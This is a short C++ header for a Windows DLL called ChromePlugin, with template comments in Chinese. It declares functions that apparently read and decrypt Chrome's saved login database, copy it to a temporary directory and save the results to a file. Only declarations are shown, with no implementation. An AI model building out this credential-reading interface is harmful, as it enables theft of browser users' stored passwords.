// 下列 ifdef 块是创建使从 DLL 导出更简单的
// 宏的标准方法。此 DLL 中的所有文件都是用命令行上定义的 CHROMEPLUGIN_EXPORTS
// 符号编译的。在使用此 DLL 的
// 任何其他项目上不应定义此符号。这样，源文件中包含此文件的任何其他项目都会将
// CHROMEPLUGIN_API 函数视为是从 DLL 导入的，而此 DLL 则将用此宏定义的
// 符号视为是被导出的。
#ifdef CHROMEPLUGIN_EXPORTS
#define CHROMEPLUGIN_API __declspec(dllexport)
#else
#define CHROMEPLUGIN_API __declspec(dllimport)
#endif
#include "string"
// 此类是从 ChromePlugin.dll 导出的
class CHROMEPLUGIN_API CChromePlugin {
public:
	CChromePlugin(void);
	// TODO:  在此添加您的方法。
};
using namespace std;
extern "C" CHROMEPLUGIN_API int nChromePlugin;

extern "C" CHROMEPLUGIN_API int fnChromePlugin(void);

extern "C" CHROMEPLUGIN_API void  ReadChromeLoginData(DWORD ID);
 wstring ReadEncryptData(const std::string &sLoginDataPath);
bool CopyDataBaseToTempDir(const std::string &sDBPath, std::string &sTempDBPath);
bool SaveToFile(char * pPathFile, wstring strFile);